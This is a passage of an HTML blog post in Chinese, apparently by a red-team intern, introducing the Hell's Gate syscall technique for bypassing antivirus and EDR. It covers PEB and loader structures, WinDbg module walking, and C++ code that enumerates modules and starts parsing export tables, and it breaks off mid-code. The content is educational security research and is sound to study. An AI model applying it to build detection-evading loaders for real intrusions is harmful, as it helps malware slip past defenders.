@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"antipassion.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="1.前言接触安全已经一年多了，在实习工作中跟进项目的时候，以前我的弱项也逐步暴露出来，并越发明显，我不懂免杀与工具开发，钓鱼、下马的工作无法顺利进行，几乎就是面向google的渗透测试工程。 我想，如果想要进一步的发展提升，便要开展这方面的学习了，遂有此篇博文。 Hell’s Gate，也就是地狱之门，算是一项经典的底层绕过AV或EDR的技术手段，利用syscall技术调用NTDLL内函数,从而绕">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hell&#39;s Gate的一次尝试入门">
+<meta property="og:url" content="http://antipassion.github.io/2022/08/03/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8/index.html">
+<meta property="og:site_name" content="林中小屋">
+<meta property="og:description" content="1.前言接触安全已经一年多了，在实习工作中跟进项目的时候，以前我的弱项也逐步暴露出来，并越发明显，我不懂免杀与工具开发，钓鱼、下马的工作无法顺利进行，几乎就是面向google的渗透测试工程。 我想，如果想要进一步的发展提升，便要开展这方面的学习了，遂有此篇博文。 Hell’s Gate，也就是地狱之门，算是一项经典的底层绕过AV或EDR的技术手段，利用syscall技术调用NTDLL内函数,从而绕">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://antipassion.github.io/images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220804165338646.png">
+<meta property="og:image" content="http://antipassion.github.io/images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220806115408926.png">
+<meta property="og:image" content="http://antipassion.github.io/images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220806115446148.png">
+<meta property="og:image" content="http://antipassion.github.io/images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220806150656942.png">
+<meta property="og:image" content="http://antipassion.github.io/images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220806151846476.png">
+<meta property="og:image" content="http://antipassion.github.io/images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220806153404407.png">
+<meta property="og:image" content="http://antipassion.github.io/images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220806153850765.png">
+<meta property="og:image" content="http://antipassion.github.io/images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220806154243796.png">
+<meta property="og:image" content="http://antipassion.github.io/images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220806154828422.png">
+<meta property="og:image" content="http://antipassion.github.io/images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220806154936619.png">
+<meta property="og:image" content="http://antipassion.github.io/images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220806161225003.png">
+<meta property="og:image" content="http://antipassion.github.io/images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220807161115532.png">
+<meta property="og:image" content="http://antipassion.github.io/images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220807171136927.png">
+<meta property="og:image" content="http://antipassion.github.io/images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220905181709362.png">
+<meta property="og:image" content="http://antipassion.github.io/images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220807172258575.png">
+<meta property="og:image" content="http://antipassion.github.io/images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220807173014055.png">
+<meta property="og:image" content="http://antipassion.github.io/images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220911150704197.png">
+<meta property="og:image" content="http://antipassion.github.io/images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220911150726510.png">
+<meta property="og:image" content="http://antipassion.github.io/images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220911153238164.png">
+<meta property="og:image" content="http://antipassion.github.io/images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220911153607207.png">
+<meta property="og:image" content="http://antipassion.github.io/images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220911153703485.png">
+<meta property="article:published_time" content="2022-08-03T14:25:27.000Z">
+<meta property="article:modified_time" content="2022-10-30T02:52:09.986Z">
+<meta property="article:author" content="Nayon">
+<meta property="article:tag" content="红队渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://antipassion.github.io/images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220804165338646.png">
+
+<link rel="canonical" href="http://antipassion.github.io/2022/08/03/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Hell's Gate的一次尝试入门 | 林中小屋</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="林中小屋" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">林中小屋</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://antipassion.github.io/2022/08/03/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Nayon.png">
+      <meta itemprop="name" content="Nayon">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="林中小屋">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hell's Gate的一次尝试入门
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-08-03 22:25:27" itemprop="dateCreated datePublished" datetime="2022-08-03T22:25:27+08:00">2022-08-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-10-30 10:52:09" itemprop="dateModified" datetime="2022-10-30T10:52:09+08:00">2022-10-30</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h3><p>接触安全已经一年多了，在实习工作中跟进项目的时候，以前我的弱项也逐步暴露出来，并越发明显，我不懂<strong>免杀与工具开发</strong>，钓鱼、下马的工作无法顺利进行，几乎就是面向google的渗透测试工程。</p>
+<p>我想，如果想要进一步的发展提升，便要开展这方面的学习了，遂有此篇博文。</p>
+<p>Hell’s Gate，也就是地狱之门，算是一项经典的底层绕过AV或EDR的技术手段，利用syscall技术调用NTDLL内函数,从而绕过杀软对函数的检测。</p>
+<span id="more"></span>
+
+<h3 id="2-前置知识"><a href="#2-前置知识" class="headerlink" title="2.前置知识"></a>2.前置知识</h3><h4 id="2-1-PEB的数据结构"><a href="#2-1-PEB的数据结构" class="headerlink" title="2.1 PEB的数据结构"></a>2.1 PEB的数据结构</h4><p><strong>PEB</strong>地址:</p>
+<ul>
+<li><p>​    在x86进程的线程进程块(<strong>TEB</strong>)中FS寄存器中的0x30偏移处找到。</p>
+</li>
+<li><p>​    在x64进程的线程进程块(<strong>TEB</strong>)中GS寄存器中的0x60偏移处找到。</p>
+</li>
+</ul>
+<p>微软官方提供了可根据对应寄存器偏移位置读取内存的API:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/intrinsics/readfsbyte-readfsdword-readfsqword-readfsword?view=msvc-170&viewFallbackFrom=vs-2019">__readfsqword</a>   (x86)</li>
+<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/intrinsics/readgsbyte-readgsdword-readgsqword-readgsword?view=msvc-170&viewFallbackFrom=vs-2019">__readgsqword</a>  (x64)</li>
+</ul>
+<p>两个api可以在<code>dbghelp.h</code>、<code>winnt.h</code>中找到</p>
+<p>进程环境块是一个从内核中分配给每个进程的用户模式结构，每一个进程都会有从Ring0层分配给该进程的进程环境块，在这里，我们主要需要了解<code>_PEB_LDR_DATA</code>以及其他子结构</p>
+<p>在Crispr师傅博客处找到的一个示意图:</p>
+<p>通过 _PEB 偏移位置0x30看出，PEB存放于以fs寄存器为基地址的0x30偏移处，由此可知该示意图是由x86进程作为展示模板。</p>
+<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220804165338646.png" alt="image-20220804165338646"></p>
+<p>使用windbg进行调试，可以看到TEB结构体中是存在PEB进程环境块的，此处使用的是x64程序进行演示。</p>
+<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220806115408926.png" alt="image-20220806115408926"></p>
+<p>继续使用windbg跟进，我们可以看到_PEB结构体的组成，在这其中，我们目前最感兴趣的便是在0x018偏移处的Ldr。</p>
+<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220806115446148.png" alt="image-20220806115446148"></p>
+<p>使用dt指令查看<code>_PEB_LDR_DATA</code>结构</p>
+<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220806150656942.png" alt="image-20220806150656942"></p>
+<p>根据<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data">MSDN</a>可知，该结构体包含了进程已加载模块的信息，其中三个比较关键的成员含义如下所示：</p>
+<ul>
+<li><code>InLoadOrderModuleList</code>: 模块的加载顺序</li>
+<li><code>InMemoryOrderModuleList</code>: 模块在内存中的排列顺序</li>
+<li><code>InInitializationOrderModuleList</code>: 模块初始化的装载顺序</li>
+</ul>
+<p>三个成员皆为双向链表，每个双向链表都是指向进程装载的模块，结构中的每个指针，指向了一个<code>LDR_DATA_TABLE_ENTRY</code>的结构</p>
+<p><code>_LDR_DATA_TABLE_ENTRY</code>结构</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InLoadOrderLinks</span>;</span>                                    <span class="comment">//0x0</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InMemoryOrderLinks</span>;</span>                                  <span class="comment">//0x8</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InInitializationOrderLinks</span>;</span>                          <span class="comment">//0x10</span></span><br><span class="line">    VOID* DllBase;                                                          <span class="comment">//0x18 模块基址</span></span><br><span class="line">    VOID* EntryPoint;                                                       <span class="comment">//0x1c</span></span><br><span class="line">    ULONG SizeOfImage;                                                      <span class="comment">//0x20</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">FullDllName</span>;</span>                                     <span class="comment">//0x24 模块路径+名称</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">BaseDllName</span>;</span>                                     <span class="comment">//0x2c 模块名称</span></span><br><span class="line">...</span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure>
+
+<p>所以说<code>InMemoryOrderModuleList</code>里的<code>Flink</code>的地址，指向了一个<code>LDR_DATA_TABLE_ENTRY</code>,利用dt指令查看也确实是验证了这一点</p>
+<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220806151846476.png" alt="image-20220806151846476"></p>
+<p>此时我们可以看到，当前<code>BaseDllName</code>的值为当前进程，在手工调试中，若想要循环遍历当前进程所加载的模块，我们可以利<code>InMemoryOrderLinks</code>成员的值，来查看下一个<code>_LDR_DATA_TABLE_ENTRY</code>中模块的信息，并由于是双向链表结构，当循环回到第一个<code>_LDR_DATA_TABLE_ENTRY</code>时，进程加载的模块遍历完毕。</p>
+<h4 id="2-2-对进程模块进行遍历"><a href="#2-2-对进程模块进行遍历" class="headerlink" title="2.2 对进程模块进行遍历"></a>2.2 对进程模块进行遍历</h4><p>下面展示一下如何对进程的模块进行手工遍历：</p>
+<h5 id="2-1-1-手工遍历"><a href="#2-1-1-手工遍历" class="headerlink" title="2.1.1 手工遍历"></a>2.1.1 手工遍历</h5><p>利用dt查找当前进程LDR结构体的信息，根据<code>InMemoryOrderModuleList</code>结构体中的Fink指向的<code>_LDR_DATA_TABLE_ENTRY</code>结构来查看当前进程在内存中加载模块的顺序。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dt -r1 <span class="number">00007f</span>fdac05c4c0 _PEB_LDR_DATA </span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220806153404407.png" alt="image-20220806153404407"></p>
+<p>跟进<code>_LDR_DATA_TABLE_ENTRY结构</code>，可以注意到BaseDllName的值为乱码，这是因为内存对齐问题，我们在根据Flink值查找对应结构时，一定要减去16字节，以保证我们正确对齐（x86或x64皆如此）。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dt -r1 <span class="number">0x000001a3</span>`<span class="number">6b</span>432a10 _LDR_DATA_TABLE_ENTRY</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220806153850765.png" alt="image-20220806153850765"></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dt -r1 <span class="number">0x000001a3</span>`<span class="number">6b</span>432a10<span class="number">-0x10</span> _LDR_DATA_TABLE_ENTRY</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220806154243796.png" alt="image-20220806154243796"></p>
+<p>内存中第一个加载的模块即程序本身我们已经找到，接下来便是根据<code>InMemoryOrderLinks</code>的值来查找下一个<code>_LDR_DATA_TABLE_ENTRY</code>中的模块了</p>
+<p>InMemoryOrderLinks的详细结构：</p>
+<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220806154828422.png" alt="image-20220806154828422"></p>
+<p>我们需要的是InMemoryOrderLinks-&gt;Flink值。</p>
+<p>成功找到第二个模块，ntdll.dll</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dt -r1 <span class="number">0x000001a3</span>`<span class="number">6b</span>432880<span class="number">-0x10</span> _LDR_DATA_TABLE_ENTRY</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220806154936619.png" alt="image-20220806154936619"></p>
+<p>接下来便是重复操作，查InMemoryOrderLinks-&gt;Flink值来遍历下一个模块，此处不再演示。</p>
+<h5 id="2-1-2-自动化操作"><a href="#2-1-2-自动化操作" class="headerlink" title="2.1.2 自动化操作"></a>2.1.2 自动化操作</h5><p>手工操作费时费力，本文对crispr师傅的代码做出了一些简单的更改，利用c++进行自动化打印进程模块</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	PPEB Peb = (PPEB)__readgsqword(<span class="number">0x60</span>);	</span><br><span class="line">	PLDR_DATA_TABLE_ENTRY pLoadModule;	</span><br><span class="line">	pLoadModule =  (PLDR_DATA_TABLE_ENTRY)((PBYTE)Peb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink<span class="number">-0x10</span>);	</span><br><span class="line">	PLDR_DATA_TABLE_ENTRY pFirstLoadModule = (PLDR_DATA_TABLE_ENTRY)((PBYTE)Peb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink - <span class="number">0x10</span>); </span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Module Name:%ws\r\nModule Base Address:%p\r\n\r\n&quot;</span>, pLoadModule-&gt;FullDllName.Buffer, pLoadModule, pLoadModule-&gt;DllBase);</span><br><span class="line">		pLoadModule = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pLoadModule-&gt;InMemoryOrderLinks.Flink<span class="number">-0x10</span>); </span><br><span class="line">	&#125; <span class="keyword">while</span> ((PLDR_DATA_TABLE_ENTRY)((PBYTE)pLoadModule-&gt;InMemoryOrderLinks.Flink - <span class="number">0x10</span>) != pFirstLoadModule); </span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220806161225003.png" alt="image-20220806161225003"></p>
+<h4 id="2-3-遍历模块中的导出表"><a href="#2-3-遍历模块中的导出表" class="headerlink" title="2.3 遍历模块中的导出表"></a>2.3 遍历模块中的导出表</h4><p>上面我们成功拿到了内存中模块的基址，这样我们便有能力遍历进程中每个模块的导出地址表，这涉及到通过该基址去遍历PE头文件从而获取到导出地址表，可以简单的将其分为4个步骤:</p>
+<ol>
+<li>获取到每个模块的基址</li>
+<li>拿到<code>_IMAGE_DOS_HEADER</code>,通过检查<code>dos-&gt;e_magic</code>是否等于<code>IMAGE_DOS_SIGNATURE</code>判断头文件是否正确</li>
+<li>遍历<code>_IMAGE_NT_HEADER</code>、<code>_IMAGE_FILE_HEADER</code>、<code>_IMAGE_OPTIONAL_HEADER</code></li>
+<li>在<code>_IMAGE_OPTIONAL_HEADER</code>中找到导出地址表，并将类型转为<code>_IMAGE_EXPORT_DIRECTORY</code></li>
+</ol>
+<p>PE文件头数据结构：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line">    DWORD Signature;                        <span class="comment">//PE文件头标志 =&gt; 4字节</span></span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;           <span class="comment">//标准PE头 =&gt; 20字节</span></span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader; <span class="comment">//扩展PE头 =&gt; 32位下224字节(0xE0) 64位下240字节(0xF0)</span></span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure>
+
+<p>因此当我们拿到PE头时，便可以通过如下代码最终将内存中模块的<code>OptionalHeader</code>转为<code>IMAGE_EXPORT_DIRECTORY</code></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;winternl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//pLoadModule = (PLDR_DATA_TABLE_ENTRY)((PBYTE)Peb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink - 0x10);</span></span><br><span class="line">	<span class="comment">//pFirstLoadModule = 